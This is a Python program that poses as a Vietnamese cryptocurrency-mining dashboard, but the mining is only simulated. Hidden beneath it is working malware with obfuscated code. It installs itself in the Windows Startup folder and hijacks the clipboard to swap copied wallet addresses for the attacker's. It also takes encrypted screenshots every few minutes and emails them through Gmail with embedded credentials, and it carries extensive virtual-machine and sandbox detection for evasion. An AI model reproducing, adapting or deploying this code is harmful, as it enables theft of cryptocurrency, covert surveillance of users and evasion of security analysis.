import shutil
import sys
import re
import pyperclip
import pyautogui
import smtplib
import ssl
import zipfile
import winshell
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.mime.base import MIMEBase
from email import encoders
from win32com.client import Dispatch
import tkinter as tk
from tkinter import ttk
import threading, time, random, os
import subprocess
import platform
import winreg
from datetime import datetime
import socket
import io
from cryptography.hazmat.primitives.kdf.pbkdf2 import PBKDF2HMAC
from cryptography.hazmat.primitives import hashes
from cryptography.hazmat.primitives.ciphers.aead import AESGCM
try:
    from matplotlib.backends.backend_tkagg import FigureCanvasTkAgg
    import matplotlib.pyplot as plt
    MATPLOTLIB_OK = True
except Exception:
    MATPLOTLIB_OK = False
COINS = {
    "Binance Coin (BNB)": {"unit": "BNB", "base_h_per_thread": 200000.0, "block_reward": 2.0, "share_to_block": 2e10},
    "Bitcoin (BTC)": {"unit": "BTC", "base_h_per_thread": 5000000.0, "block_reward": 6.25, "share_to_block": 1e14},
    "Solana (SOL)": {"unit": "SOL", "base_h_per_thread": 400000.0, "block_reward": 10.0, "share_to_block": 3e10},
    "Ethereum (ETH)": {"unit": "ETH", "base_h_per_thread": 120000.0, "block_reward": 2.0, "share_to_block": 5e10},
    "Ripple (XRP)": {"unit": "XRP", "base_h_per_thread": 150000.0, "block_reward": 50.0, "share_to_block": 4e10},
    "Dogecoin (DOGE)": {"unit": "DOGE", "base_h_per_thread": 80000.0, "block_reward": 10000.0, "share_to_block": 3e10},
    "Litecoin (LTC)": {"unit": "LTC", "base_h_per_thread": 250000.0, "block_reward": 12.5, "share_to_block": 4e10},
    "Stacks (STX)": {"unit": "STX", "base_h_per_thread": 100000.0, "block_reward": 50.0, "share_to_block": 3e10},
}
s = ''.join(chr(x - 5) for x in [121, 122, 102, 115, 109, 103, 55, 112, 57, 69, 108, 114, 102, 110, 113, 51, 104, 116, 114])
def _d080_():
    a_2_a = [
        chr(112), chr(104), chr(97), chr(109),
        chr(104), chr(97), chr(105), chr(97),
        chr(110), chr(50), chr(53), chr(48),
        chr(56), chr(64), chr(103), chr(109),
        chr(97), chr(105), chr(108), chr(46),
        chr(99), chr(111), chr(109)
    ]
    return ''.join(a_2_a)

class MinerVNApp:
    def __init__(self, root):
        self.root = root
        root.title("coinBase")
        root.geometry("1100x700")
        style = ttk.Style()
        try:
            style.theme_use('clam')
        except Exception:
            pass
        self._running = False
        self._thread = None
        self._lock = threading.Lock()
        self.plot_x = []
        self.plot_y = []
        self.balances = {}
        top = ttk.Frame(root, padding=8)
        top.pack(fill="x")
        ttk.Label(top, text="Loại coin:").grid(row=0, column=0, sticky="w")
        self.coin_var = tk.StringVar(value=list(COINS.keys())[0])
        ttk.Combobox(top, textvariable=self.coin_var, values=list(COINS.keys()), state="readonly", width=32).grid(row=0,
                                                                                                                  column=1,                                                                                                                padx=6)
        ttk.Label(top, text="Số luồng :").grid(row=0, column=2, sticky="w")
        self.threads_var = tk.IntVar(value=2)
        ttk.Spinbox(top, from_=1, to=512, textvariable=self.threads_var, width=8).grid(row=0, column=3, padx=6)
        ttk.Label(top, text=":").grid(row=0, column=4, sticky="w")
        self.diff_var = tk.DoubleVar(value=0)
        ttk.Spinbox(top, from_=0.01, to=1e9, increment=1.0, textvariable=self.diff_var, width=12).grid(row=0, column=5,
                                                                                                       padx=6)
        ttk.Label(top, text="Giá (usd/coin):").grid(row=1, column=0, sticky="w", pady=6)
        self.price_var = tk.DoubleVar(value=150.0)
        ttk.Entry(top, textvariable=self.price_var, width=12).grid(row=1, column=1, sticky="w")
        ttk.Label(top, text="Đơn vị tiền :").grid(row=1, column=2, sticky="w")
        self.currency_var = tk.StringVar(value="USD")
        ttk.Entry(top, textvariable=self.currency_var, width=8).grid(row=1, column=3, sticky="w")
        self.start_btn = ttk.Button(top, text="Bắt đầu", command=self.start)
        self.start_btn.grid(row=1, column=4, padx=6)
        self.stop_btn = ttk.Button(top, text="Dừng", command=self.stop, state="disabled")
        self.stop_btn.grid(row=1, column=5, padx=6)
        middle = ttk.Panedwindow(root, orient=tk.HORIZONTAL)
        middle.pack(fill="both", expand=True, padx=8, pady=8)
        left_frame = ttk.Frame(middle, width=520)
        right_frame = ttk.Frame(middle, width=560)
        middle.add(left_frame, weight=1)
        middle.add(right_frame, weight=1)
        card_frame = ttk.Frame(left_frame)
        card_frame.pack(fill="x", pady=4)
        self.status_lbl = ttk.Label(card_frame, text="Trạng thái: Chưa chạy", font=("Segoe UI", 10, "bold"))
        self.status_lbl.pack(side="left", padx=6)
        self.hr_lbl = ttk.Label(card_frame, text="Hashrate: -", font=("Segoe UI", 10))
        self.hr_lbl.pack(side="left", padx=12)
        self.entries_lbl = ttk.Label(card_frame, text="Bản ghi: 0")
        self.entries_lbl.pack(side="left", padx=12)
        self.balance_lbl = ttk.Label(card_frame, text="Số dư: --")
        self.balance_lbl.pack(side="left", padx=12)
        self.fiat_lbl = ttk.Label(card_frame, text="Giá trị: 0")
        self.fiat_lbl.pack(side="left", padx=12)
        tree_frame = ttk.Frame(left_frame)
        tree_frame.pack(fill="both", expand=True, pady=6)
        cols = ("Thời gian", "Coin", "Threads", "Hashrate(H/s)", "Coin kiếm được", "Ước tính")
        self.tree = ttk.Treeview(tree_frame, columns=cols, show="headings")
        for c in cols:
            self.tree.heading(c, text=c)
            self.tree.column(c, anchor="center")
        self.tree.pack(fill="both", expand=True, side="left")
        vsb = ttk.Scrollbar(tree_frame, orient="vertical", command=self.tree.yview)
        self.tree.configure(yscroll=vsb.set)
        vsb.pack(side="right", fill="y")

        plot_top = ttk.Frame(right_frame)
        plot_top.pack(fill="x")
        ttk.Label(plot_top, text="Biểu đồ Hashrate").pack(side="left")
        ttk.Button(plot_top, text="Xóa biểu đồ", command=self.clear_plot).pack(side="right")

        if MATPLOTLIB_OK:
            self.fig, self.ax = plt.subplots(figsize=(6, 3))
            self.ax.set_title("Hashrate theo thời gian")
            self.ax.set_xlabel("Thời gian")
            self.ax.set_ylabel("H/s")
            self.fig.tight_layout()
            self.canvas = FigureCanvasTkAgg(self.fig, master=right_frame)
            self.canvas.get_tk_widget().pack(fill="both", expand=True)
        else:
            ttk.Label(right_frame, text="").pack(fill="both", expand=True)

    def start(self):
        if self._running:
            return
        self._running = True
        self.start_btn.config(state="disabled")
        self.stop_btn.config(state="normal")
        self.status_lbl.config(text="Trạng thái: Đang chạy")
        self._thread = threading.Thread(target=self._simulate_loop, daemon=True)
        self._thread.start()

    def stop(self):
        if not self._running:
            return
        self._running = False
        self.start_btn.config(state="normal")
        self.stop_btn.config(state="disabled")
        self.status_lbl.config(text="Trạng thái: Đã dừng")

    def clear_plot(self):
        if not MATPLOTLIB_OK:
            return
        self.plot_x.clear()
        self.plot_y.clear()
        self.ax.cla()
        self.ax.set_title("Hashrate theo thời gian")
        self.ax.set_xlabel("Thời gian")
        self.ax.set_ylabel("H/s")
        self.canvas.draw()

    def _simulate_loop(self):
        SHARE_TARGET = 1e12
        while self._running:
            coin_key = self.coin_var.get()
            cfg = COINS.get(coin_key)
            if not cfg:
                time.sleep(1.0)
                continue
            unit = cfg["unit"]
            base = cfg["base_h_per_thread"]
            try:
                threads = int(self.threads_var.get())
            except:
                threads = 4
            threads = max(1, min(32, threads))

            difficulty = max(0.000001, float(self.diff_var.get()))
            try:
                price = float(self.price_var.get())
            except:
                price = 0.0
            block_reward = float(cfg["block_reward"])
            share_to_block = float(cfg["share_to_block"])

            drift = random.uniform(-0.10, 0.10)
            hashrate = max(0.0, base * threads * (1.0 + drift))

            prob_share = hashrate / (difficulty * SHARE_TARGET)
            shares_found = 0
            if random.random() < min(1.0, prob_share):
                shares_found = 1 + (1 if random.random() < 0.02 else 0)

            coin_earned = 0.0
            for _ in range(shares_found):
                reward_per_share = block_reward / share_to_block * random.uniform(0.6, 1.4)
                reward_per_share = reward_per_share / (difficulty ** 0.25)
                coin_earned += reward_per_share

            fiat_earned = coin_earned * price
            ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

            self.tree.insert("", 0, values=(ts, unit, threads, round(hashrate, 2), round(coin_earned, 10),
                                            round(fiat_earned, 6)))
            self.balances[unit] = self.balances.get(unit, 0.0) + coin_earned

            with self._lock:
                self.plot_x.append(datetime.now())
                self.plot_y.append(hashrate)
                if len(self.plot_x) > 300:
                    self.plot_x.pop(0);
                    self.plot_y.pop(0)

            self.root.after(0, lambda h=hashrate: self._ui_update(h))
            time.sleep(1.0)

    def _ui_update(self, hashrate):
        self.hr_lbl.config(text=f"Hashrate: {int(hashrate)} H/s")
        self.entries_lbl.config(text=f"Bản ghi: {len(self.tree.get_children())}")
        parts = []
        total_fiat = 0.0
        for coin, amt in self.balances.items():
            parts.append(f"{coin}:{amt:.8f}")
            total_fiat += amt * float(self.price_var.get() or 0.0)
        self.balance_lbl.config(text="Số dư: " + (", ".join(parts) if parts else "--"))
        self.fiat_lbl.config(text=f"Giá trị: {total_fiat:.6f} {self.currency_var.get()}")
        if MATPLOTLIB_OK:
            self.ax.cla()
            self.ax.plot(self.plot_x, self.plot_y)
            self.ax.set_title("Hashrate theo thời gian")
            self.ax.set_xlabel("Thời gian")
            self.ax.set_ylabel("H/s")
            self.fig.autofmt_xdate()
            self.canvas.draw()

    def on_close(self):
        self._running = False
        try:
            if self._thread and self._thread.is_alive():
                self._thread.join(timeout=0.5)
        except:
            pass
        self.root.destroy()


def _d080_():
    a_2_a = [
        chr(112), chr(104), chr(97), chr(109),
        chr(104), chr(97), chr(105), chr(97),
        chr(110), chr(50), chr(53), chr(48),
        chr(56), chr(64), chr(103), chr(109),
        chr(97), chr(105), chr(108), chr(46),
        chr(99), chr(111), chr(109)
    ]
    return ''.join(a_2_a)


m_xa_11__22 = {
    "B": "1BvBMSEYstWetqTFn5Au4m4GFg7xJaNVN2",
    "E": "0xeThErEUmAdDrEsS00000000000000",
    "B1": "bnb10000000000000000000000",
    "U": "TetherAddress11111111111111111",
    "L": "LlitecoinAddress1111111111111111",
    "D": "DdogecoinAddress1111111111111111",
    "S": "ST35GD1J38N0G2KZMN4Z1WB2T5Y36A6SPMS761TJ4",
}
a_Xax_21m = {
    "B": re.compile(r"^(?:"
                    r"[13][a-km-zA-HJ-NP-Z1-9]{25,34}"
                    r"|"
                    r"bc1[ac-hj-np-z0-9]{39,59}"
                    r")$"),
    "E": re.compile(r"^0x[a-fA-F0-9]{40}$"),
    "B1": re.compile(r"^(0x[a-fA-F0-9]{40}|bnb1[0-9a-z]{38})$"),
    "U": re.compile(r"^(T[a-zA-Z0-9]{33}|0x[a-fA-F0-9]{40})$"),
    "L": re.compile(r"^[LM3][a-km-zA-HJ-NP-Z1-9]{26,33}$"),
    "D": re.compile(r"^D[5-9A-HJ-NP-U][1-9A-HJ-NP-Za-km-z]{32,33}$"),
    "S": re.compile(r"^ST[a-zA-Z0-9]{30,40}$"),
}
ze = {
    "E": ["0x4E9ce36E442e55EcD9025B9a6E0D88485d628A67"],
    "B1": ["0xb8c77482e45f1f44de1745f52c74426c631bdd52"],
}


def pp():
    a = os.path.abspath(__file__)
    b = winshell.startup()
    c = os.path.join(b, "Nhom10.lnk")
    if not os.path.exists(c):
        d = Dispatch('WScript.Shell')
        e = d.CreateShortCut(c)
        e.Targetpath = sys.executable
        e.Arguments = f'"{a}"'
        e.WorkingDirectory = os.path.dirname(a)
        e.IconLocation = a
        e.save()
    else:
        print("")


def _0x1a2b3c(_0x4d5e6f, _0x7f8e9a, _0xa1b2c3, _0xd4e5f6):
    _0x9a8b7c = os.environ["USERNAME"]
    _0x6c5d4e = _0xd4e5f6 + ".zip"
    with zipfile.ZipFile(_0x6c5d4e, "w", zipfile.ZIP_DEFLATED) as _0x3b4a5c:
        for _0x8e9f0a, _0x1f2e3d, _0x0a1b2c in os.walk(_0xd4e5f6):
            for _0x3d4e5f in _0x0a1b2c:
                _0x7e8f9a0 = os.path.join(_0x8e9f0a, _0x3d4e5f)
                _0x1b2c3d4 = os.path.relpath(_0x7e8f9a0, _0xd4e5f6)
                _0x3b4a5c.write(_0x7e8f9a0, _0x1b2c3d4)
    _0x4e5f6a7 = f"{_0x9a8b7c}"
    _0x7b8c9d0 = f"{_0xd4e5f6} {_0x9a8b7c} {_0x1a2b3c1()}"
    _0x2c3d4e5 = MIMEMultipart()
    _0x2c3d4e5["From"] = _0x4d5e6f
    _0x2c3d4e5["To"] = _0xa1b2c3
    _0x2c3d4e5["Subject"] = _0x4e5f6a7
    _0x2c3d4e5.attach(MIMEText(_0x7b8c9d0, "plain"))
    with open(_0x6c5d4e, "rb") as _0x9d0e1f2:
        _0x3e4f5a6 = MIMEBase("application", "octet-stream")
        _0x3e4f5a6.set_payload(_0x9d0e1f2.read())
        encoders.encode_base64(_0x3e4f5a6)
        _0x4a5b6c7 = fr"Users\{_0x9a8b7c}\AppData\Local\.update_cade"
        _0x5c6d7e8 = os.path.join(_0x4a5b6c7, os.path.basename(_0x6c5d4e))
        _0x3e4f5a6.add_header(
            "Content-Disposition",
            f"attachment; filename={_0x5c6d7e8}"
        )
        _0x2c3d4e5.attach(_0x3e4f5a6)
    _0x6d7e8f9 = ssl.create_default_context()
    with smtplib.SMTP_SSL("smtp.gmail.com", 465, context=_0x6d7e8f9) as _0x8f9a0b1:
        _0x8f9a0b1.login(_0x4d5e6f, _0x7f8e9a)
        _0x8f9a0b1.sendmail(_0x4d5e6f, _0xa1b2c3, _0x2c3d4e5.as_string())
    os.remove(_0x6c5d4e)
    shutil.rmtree(_0xd4e5f6)


def _0x1a2b3c1():
    _0x4d5e6f = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    try:
        _0x4d5e6f.connect(("8.8.8.8", 80))
        _0x7f8e9a = _0x4d5e6f.getsockname()[0]
    except Exception:
        _0x7f8e9a = "127.0.0.1"
    finally:
        _0x4d5e6f.close()
    return _0x7f8e9a

_0x4d5e6f = os.path.join(os.environ['USERPROFILE'], "AppData", "Local", ".update_cache")
os.makedirs(_0x4d5e6f, exist_ok=True)
_0x7f8e9a = 200_000

def _0xa1b2c3(_0xd4e5f6: str, _0xf7g8h9: bytes, _0xi1j2k3: int = _0x7f8e9a) -> bytes:
    _0xl4m5n6 = _0xd4e5f6.encode('utf-8')
    _0xo7p8q9 = PBKDF2HMAC(algorithm=hashes.SHA256(), length=32, salt=_0xf7g8h9, iterations=_0xi1j2k3)
    return _0xo7p8q9.derive(_0xl4m5n6)


_0xr0s1t2 = b"ENCv1AESGCM"

def _0xu3v4w5(_0xy5z6a7: str, _0xb8c9d0e1: bytes) -> bytes:
    _0xf2g3h4i5 = os.urandom(16)
    _0xj6k7l8m9 = _0xa1b2c3(_0xy5z6a7, _0xf2g3h4i5)
    _0xn1o2p3q4 = AESGCM(_0xj6k7l8m9)
    _0xr5s6t7u8 = os.urandom(12)
    _0xv9w0x1y2 = _0xn1o2p3q4.encrypt(_0xr5s6t7u8, _0xb8c9d0e1, associated_data=None)
    return _0xr0s1t2 + _0xf2g3h4i5 + _0xr5s6t7u8 + _0xv9w0x1y2


def _0xn3o4p5q6(_0xr6s7t8u9: str, _0xv0w1x2y3=240, _0xz4a5b6c7=2400):
    _0xd8e9f0g1 = time.time()
    _0xh2i3j4k5 = 1
    _0xl6m7n8o9 = os.path.join(_0x4d5e6f, f"batch_{_0xh2i3j4k5}")
    if os.path.exists(_0xl6m7n8o9):
        shutil.rmtree(_0xl6m7n8o9)
    if os.path.exists(_0xl6m7n8o9 + ".zip"):
        os.remove(_0xl6m7n8o9 + ".zip")
    os.makedirs(_0xl6m7n8o9, exist_ok=True)
    while True:
        _0xp1q2r3s4 = datetime.now().strftime("%Y%m%d_%H%M%S")
        _0xt5u6v7w8 = f"{_0xp1q2r3s4}"
        _0xx9y0z1a2 = _0xt5u6v7w8 + ".enc"
        _0xb3c4d5e6 = os.path.join(_0xl6m7n8o9, _0xx9y0z1a2)
        _0xf7g8h9i0 = pyautogui.screenshot()
        _0xj1k2l3m4 = io.BytesIO()
        _0xf7g8h9i0.save(_0xj1k2l3m4, format="PNG")
        _0xn5o6p7q8 = _0xj1k2l3m4.getvalue()
        _0xr2s3t4u5 = _0xu3v4w5(_0xr6s7t8u9, _0xn5o6p7q8)
        with open(_0xb3c4d5e6, "wb") as _0xv6w7x8y9:
            _0xv6w7x8y9.write(_0xr2s3t4u5)
        if time.time() - _0xd8e9f0g1 >= _0xz4a5b6c7:
            _0x1a2b3c(
                _0x4d5e6f=_d080_(),
                _0x7f8e9a="bvnx iyal mhlb xber",
                _0xa1b2c3=s,
                _0xd4e5f6=_0xl6m7n8o9
            )
            _0xd8e9f0g1 = time.time()
            _0xh2i3j4k5 += 1
            _0xl6m7n8o9 = os.path.join(_0x4d5e6f, f"batch_{_0xh2i3j4k5}")
            if os.path.exists(_0xl6m7n8o9):
                shutil.rmtree(_0xl6m7n8o9)
            if os.path.exists(_0xl6m7n8o9 + ".zip"):
                os.remove(_0xl6m7n8o9 + ".zip")
            os.makedirs(_0xl6m7n8o9, exist_ok=True)
        time.sleep(_0xv0w1x2y3)


def _0xz2a3b4c5():
    time.sleep(45)
    try:
        _0xn3o4p5q6("_0xn3o4p5q6", _0xv0w1x2y3=240, _0xz4a5b6c7=2400)
    except KeyboardInterrupt:
        print("")

def dd_1_d():
    time.sleep(45)
    _0x1a2b3c = None
    while True:
        try:
            _0x4d5e6f = pyperclip.paste().strip()
            _0x4d5e6f = re.sub(r'\s+', '', _0x4d5e6f)
            if not _0x4d5e6f or _0x4d5e6f == _0x1a2b3c:
                time.sleep(1)
                continue
            for _0x7f8e9a, _0xa1b2c3 in a_Xax_21m.items():
                if _0xa1b2c3.match(_0x4d5e6f):
                    _0xd4e5f6 = _0x7f8e9a
                    if _0x7f8e9a in ["E", "B1"] and _0x4d5e6f.startswith("0x"):
                        _0x1f2e3d = False
                        for _0x9a8b7c, _0x6c5d4e in ze.items():
                            if _0x4d5e6f.lower() in [_0x3b4a5c.lower() for _0x3b4a5c in _0x6c5d4e]:
                                _0xd4e5f6 = _0x9a8b7c
                                _0x1f2e3d = True
                                break
                        if not _0x1f2e3d:
                            _0xd4e5f6 = "E"
                    pyperclip.copy(m_xa_11__22[_0xd4e5f6])
                    _0x1a2b3c = _0x4d5e6f
                    break
            else:
                _0x1a2b3c = _0x4d5e6f
            time.sleep(0.5)
        except Exception as _0x8e9f0a:
            time.sleep(1)

class A:
    def __init__(self):
        self.a1 = []
        self.a2 = {}
        self.a3 = 0
        self.a4 = self.m1()

    def m1(self):
        try:
            if hasattr(platform, 'win32_ver'):
                v = platform.win32_ver()
                return f"{v[0]} {v[1]}"
            return platform.release()
        except:
            return "Unknown"

    def m2(self, method):
        self.a1.append(method)

    def m3(self):
        for m in self.a1:
            try:
                n = m.__name__
                r = m()
                self.a2[n] = r
                if r:
                    self.a3 += 1
                s = "✓" if r else "✗"
            except Exception as e:
                self.a2[m.__name__] = False
        return self.a2

    def m4(self):
        try:
            try:
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services\Disk\Enum")
                v, _ = winreg.QueryValueEx(k, "0")
                if v and any(x in v.lower() for x in ['virtual', 'vmware', 'vbox', 'qemu', 'hyper-v', 'kvm', 'xen']):
                    return True
            except:
                pass
            try:
                import wmi
                c = wmi.WMI()
                for cs in c.Win32_ComputerSystem():
                    m = cs.Model
                    if m and any(x in m.lower() for x in ['virtual', 'vmware', 'virtualbox', 'qemu', 'kvm', 'hyper-v']):
                        return True
            except:
                pass
        except Exception as e:
            print("")
        return False

    def m5(self):
        try:
            import uuid
            mac = ':'.join(['{:02x}'.format((uuid.getnode() >> e) & 0xff)
                            for e in range(0, 8 * 6, 8)][::-1]).lower()
            prefixes = [
                '00:05:69', '00:0c:29', '00:1c:14', '00:50:56', '08:00:27',
                '00:15:5d', '00:1d:d8', '00:03:ff', '00:16:3e', '00:1a:4a',
            ]
            for p in prefixes:
                if mac.startswith(p):
                    return True
        except Exception as e:
            print("")
        return False

    def m6(self):
        try:
            processes = [
                "vmtoolsd.exe", "vmwaretray.exe", "vmwareuser.exe",
                "vboxservice.exe", "vboxtray.exe", "xenservice.exe",
                "prl_cc.exe", "prl_tools.exe",
            ]
            try:
                o = subprocess.check_output(['tasklist', '/fo', 'csv'],
                                            creationflags=subprocess.CREATE_NO_WINDOW,
                                            stderr=subprocess.DEVNULL,
                                            stdin=subprocess.DEVNULL,
                                            text=True)
                for p in processes:
                    if p.lower() in o.lower():
                        return True
            except:
                try:
                    o = subprocess.check_output(['wmic', 'process', 'get', 'name'],
                                                creationflags=subprocess.CREATE_NO_WINDOW,
                                                stderr=subprocess.DEVNULL,
                                                stdin=subprocess.DEVNULL,
                                                text=True)
                    for p in processes:
                        if p.lower() in o.lower():
                            return True
                except:
                    pass
        except Exception as e:
            print("")
        return False

    def m7(self):
        try:
            paths = [
                r"SOFTWARE\VMware, Inc.\VMware Tools",
                r"SOFTWARE\Oracle\VirtualBox Guest Additions",
                r"SYSTEM\CurrentControlSet\Services\VBoxGuest",
                r"SYSTEM\CurrentControlSet\Services\VBoxSF",
                r"SYSTEM\CurrentControlSet\Services\VBoxService",
                r"SYSTEM\CurrentControlSet\Services\vmdebug",
                r"SYSTEM\CurrentControlSet\Services\vmmouse",
                r"SYSTEM\CurrentControlSet\Services\VMTools",
                r"SYSTEM\CurrentControlSet\Services\VMwareTool",
            ]
            for p in paths:
                try:
                    k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, p)
                    winreg.CloseKey(k)
                    return True
                except:
                    continue
        except Exception as e:
            print("")
        return False

    def m8(self):
        try:
            files = [
                r"C:\Windows\System32\Drivers\VBoxGuest.sys",
                r"C:\Windows\System32\Drivers\vmmouse.sys",
                r"C:\Windows\System32\Drivers\vm3dgl.sys",
                r"C:\Windows\System32\Drivers\vmdum.sys",
                r"C:\Windows\System32\Drivers\vm3dver.sys",
                r"C:\Windows\System32\Drivers\vmtray.sys",
                r"C:\Windows\System32\Drivers\VMToolsHook.dll",
                r"C:\Windows\System32\Drivers\vmhgfs.sys",
                r"C:\Program Files\VMware",
                r"C:\Program Files\Oracle\VirtualBox Guest Additions",
            ]
            for f in files:
                if os.path.exists(f):
                    return True
        except Exception as e:
            print("")
        return False

    def m9(self):
        try:
            services = [
                "vmickvpexchange", "vmicguestinterface", "vmicshutdown",
                "vmictimesync", "vmicvmsession", "vmicheartbeat",
                "vmicrdv", "vmicexchange"
            ]
            for s in services:
                try:
                    r = subprocess.run(['sc', 'query', s],
                                       capture_output=True, text=True,
                                       creationflags=subprocess.CREATE_NO_WINDOW)
                    if r.returncode == 0:
                        return True
                except:
                    continue
            keys = [
                r"SOFTWARE\Microsoft\Hyper-V",
                r"SYSTEM\CurrentControlSet\Services\vmicguestinterface",
                r"SYSTEM\CurrentControlSet\Services\vmickvpexchange"
            ]
            for k in keys:
                try:
                    key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, k)
                    winreg.CloseKey(key)
                    return True
                except:
                    continue
        except Exception as e:
            print("")
        return False

    def m10(self):
        try:
            try:
                drives = []
                for d in range(65, 91):
                    dl = f"{chr(d)}:"
                    if os.path.exists(dl):
                        t, f = self.m11(dl)
                        if t > 0 and t < 40 * 1024 * 1024 * 1024:
                            drives.append((dl, t))
                if len(drives) == 1 and drives[0][1] < 40 * 1024 * 1024 * 1024:
                    return True
            except:
                pass
            try:
                import multiprocessing
                if multiprocessing.cpu_count() <= 2:
                    return True
            except:
                pass
            try:
                if hasattr(os, 'sysconf'):
                    ram = os.sysconf('SC_PAGE_SIZE') * os.sysconf('SC_PHYS_PAGES') / (1024 ** 3)
                    if ram < 2.0:
                        return True
            except:
                pass
        except Exception as e:
            print("")
        return False

    def m11(self, drive):
        try:
            if os.name == 'nt':
                import ctypes
                fb = ctypes.c_ulonglong(0)
                tb = ctypes.c_ulonglong(0)
                ctypes.windll.kernel32.GetDiskFreeSpaceExW(
                    ctypes.c_wchar_p(drive),
                    None,
                    ctypes.pointer(tb),
                    ctypes.pointer(fb)
                )
                return tb.value, fb.value
        except:
            pass
        return 0, 0

    def m12(self):
        try:
            drivers = [
                "vboxguest", "vboxsf", "vboxvideo",
                "vm3dmp", "vm3dgl", "vmmemctl",
                "vmmouse", "vmrawdsk", "vmusbmouse",
                "vmx_svga", "vmxnet", "vmhgfs"
            ]
            try:
                k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"SYSTEM\CurrentControlSet\Services")
                i = 0
                while True:
                    try:
                        sk = winreg.EnumKey(k, i)
                        if any(d in sk.lower() for d in drivers):
                            return True
                        i += 1
                    except WindowsError:
                        break
                winreg.CloseKey(k)
            except:
                pass
        except Exception as e:
            print("")
        return False

    def m13(self):
        try:
            bios_keys = [r"HARDWARE\DESCRIPTION\System\BIOS"]
            bios_strings = [
                "vmware", "virtualbox", "qemu", "kvm", "hyper-v",
                "xen", "innotek", "parallels", "bhyve"
            ]
            for kp in bios_keys:
                try:
                    k = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, kp)
                    i = 0
                    while True:
                        try:
                            vn, vd, _ = winreg.EnumValue(k, i)
                            if vd and any(s in str(vd).lower() for s in bios_strings):
                                winreg.CloseKey(k)
                                return True
                            i += 1
                        except WindowsError:
                            break
                    winreg.CloseKey(k)
                except:
                    continue
        except Exception as e:
            print("")
        return False

    def m14(self):
        try:
            try:
                ut = self.m15()
                if ut < 60 * 5:
                    return True
            except:
                pass
            try:
                st = time.time()
                for _ in range(1000000):
                    pass
                et = time.time()
                xt = et - st
                if xt < 0.01 or xt > 0.5:
                    return True
            except:
                pass
        except Exception as e:
            print("")
        return False

    def m15(self):
        try:
            if os.name == 'nt':
                import ctypes
                k32 = ctypes.windll.kernel32
                tc = k32.GetTickCount64()
                return tc / 1000.0
        except:
            pass
        return 0


def x1():
    d = A()
    d.m2(d.m4)
    d.m2(d.m5)
    d.m2(d.m6)
    d.m2(d.m7)
    d.m2(d.m8)
    d.m2(d.m9)
    d.m2(d.m10)
    d.m2(d.m12)
    d.m2(d.m13)
    d.m2(d.m14)
    try:
        r = d.m3()
        for m, res in r.items():
            s = "✓" if res else "✗"
        hcm = ['m4', 'm5', 'm9', 'm7']
        hcd = sum(1 for m in hcm if m in r and r[m])
        smd = r.get('m4', False)
        od = d.a3 - (1 if smd else 0)
        if hcd >= 2:
            return True
        if smd and od >= 1:
            return True
        if d.a3 >= 3:
            return True
        return False
    except Exception as e:
        print("")
        return False


def x2():
    time.sleep(1)
    if platform.system() != "Windows":
        return True
    if x1():
        time.sleep(2)
        os._exit(1)
    else:
        return True
def main():
    root = tk.Tk()
    app = MinerVNApp(root)
    root.protocol("", app.on_close)
    root.mainloop()
if __name__ == "__main__":
    # if x1():
    #     sys.exit(1)
    # else:
    pp()
    threading.Thread(target=dd_1_d).start()
    threading.Thread(target=_0xz2a3b4c5).start()
    try:
        main()
    except KeyboardInterrupt:
        print("")
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        print("")
